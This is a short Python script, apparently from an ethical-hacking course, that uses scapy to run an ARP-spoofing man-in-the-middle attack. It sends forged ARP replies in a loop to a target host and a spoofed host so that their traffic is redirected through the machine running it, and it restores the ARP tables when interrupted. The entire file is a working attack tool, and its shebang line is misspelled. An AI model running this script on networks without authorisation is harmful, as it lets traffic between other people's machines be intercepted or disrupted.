#!usr/bin/evn python

import scapy.all as scapy
import sys
import time
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target IP / IP range.")
    parser.add_option("-s", "--spoof", dest="spoof_ip", help="Spoof IP / IP range.")
    (options, argument) = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Please specify an target_ip, use --help for more info.")
    elif not options.spoof_ip:
        parser.error("[-] Please specify an spoof_ip, use --help for more info.")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
sent_packet_count = 0
try:
    while True:
        spoof(options.target_ip, options.spoof_ip)
        spoof(options.spoof_ip, options.target_ip)
        sent_packet_count += 2
        print("\r[+] Packets sent: " + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ....... Resetting ARP tables...... Please wait.\n")
    restore(options.target_ip, options.spoof_ip)
    restore(options.spoof_ip, options.target_ip)
